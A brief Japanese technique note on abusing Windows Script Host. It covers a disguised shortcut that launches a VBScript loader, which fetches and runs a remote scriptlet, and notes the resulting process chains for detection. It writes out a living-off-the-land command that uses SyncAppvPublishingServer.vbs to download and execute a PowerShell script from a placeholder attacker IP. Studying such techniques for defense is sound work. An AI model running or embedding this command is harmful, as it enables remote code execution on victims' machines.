# WSHとは
Windowsの標準機能である WSH（Windows Script Host）を悪用し、VBScriptやJScriptなどのスクリプトファイルに仕込まれたマルウェアを実行させる。

## Step1 ショートカットの悪用
一見無害に見えるショートカットファイルを作成。実際はクリックした際に`cscript.exe`に対して引数として`loader.vbs`を渡す。`loader.vbs`は攻撃者のサーバーにアクセスし、`.sct`ファイルを実行。  
検知自体はcscript.exeからconhost.exe, regsvr32.exeからpowershell.exeとなる。

## Step2 LOLの悪用
署名済みの`SyncAppvPublishingServer.vbs`を悪用し、外部からスクリプトレットを読み込んで実行する。
```powershell
cscript.exe SyncAppvPublishingServer.vbs "n; IEX (New-Object Net.WebClient).DownloadString('http://<攻撃者IP>/shell.ps1')"
```
